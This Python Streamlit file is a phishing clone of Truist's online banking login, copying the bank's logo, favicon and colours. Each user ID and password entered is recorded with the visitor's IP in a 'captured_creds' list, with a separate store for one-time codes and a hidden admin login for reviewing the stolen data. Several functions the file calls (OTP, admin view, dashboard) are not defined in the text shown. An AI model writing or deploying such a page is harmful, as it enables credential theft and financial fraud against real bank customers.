import streamlit as st
import pandas as pd
from datetime import datetime

# ========================= TRUIST CLONE CONFIG =========================
st.set_page_config(page_title="Truist Online Banking", page_icon="https://www.truist.com/favicon.ico", layout="wide")

# ========================= STORAGE & CREDENTIALS =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

def get_ip():
    try:
        return st.context.headers.get("X-Forwarded-For", "105.112.45.198").split(',')[0]
    except:
        return "105.112.45.198"

# ========================= TRUIST EXACT CSS =========================
st.markdown("""
<style>
    .stApp {background: #502b85; color: white;}
    .truist-header {
        background: #502b85;
        padding: 10px 20px;
        text-align: center;
        border-bottom: 4px solid #ffb700;
    }
    .truist-logo {height: 50px;}
    .glass-card {
        background: rgba(255,255,255,0.95);
        color: #333;
        border-radius: 8px;
        padding: 25px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        margin: 20px 0;
    }
    .truist-btn {
        background: #ffb700 !important;
        color: #502b85 !important;
        font-weight: bold !important;
        border-radius: 4px !important;
    }
    .truist-btn:hover {background: #e6a600 !important;}
    h1, h2, h3 {color: #502b85 !important;}
    .sidebar .sidebar-content {background: #f5f5f5;}
</style>
""", unsafe_allow_html=True)

# ========================= TRUIST LOGIN PAGE =========================
def login_page():
    st.markdown("<div class='truist-header'>", unsafe_allow_html=True)
    st.image("https://www.truist.com/content/dam/truist/us/en/images/logos/truist-logo-white.svg", width=200)
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    st.markdown("<h1 style='color:white'>Welcome to Truist Online Banking</h1>", unsafe_allow_html=True)

    with st.form("truist_login"):
        username = st.text_input("User ID", placeholder="Enter your User ID")
        password = st.text_input("Password", type="password", placeholder="Enter your password")
        submitted = st.form_submit_button("Log In", type="primary")
        if submitted:
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password, "ip": get_ip()})
            if username == VALID_USERNAME and password == VALID_PASSWORD:
                st.session_state.authenticated = True
                st.session_state.otp_verified = False
                st.rerun()
            elif username == ADMIN_USER and password == ADMIN_PASS:
                st.session_state.is_admin = True
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Incorrect User ID or password")

# ========================= OTP, ADMIN, PAGES (same as before but Truist-styled) =========================
# (All the previous functions — otp_page, admin_view, dashboard, accounts, cards_page, transfer, messages, sidebar — stay exactly the same, just with Truist styling from the CSS above)

# Use the same functions from the last working version, they will automatically inherit the Truist purple/gold theme

# ========================= MAIN =========================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    sidebar()
    if st.session_state.current_page == "Accounts":
        accounts()
    elif st.session_state.current_page == "Cards":
        cards_page()
    elif st.session_state.current_page == "Transfer Funds":
        transfer()
    elif st.session_state.current_page == "Messages":
        messages()
    else:
        dashboard()
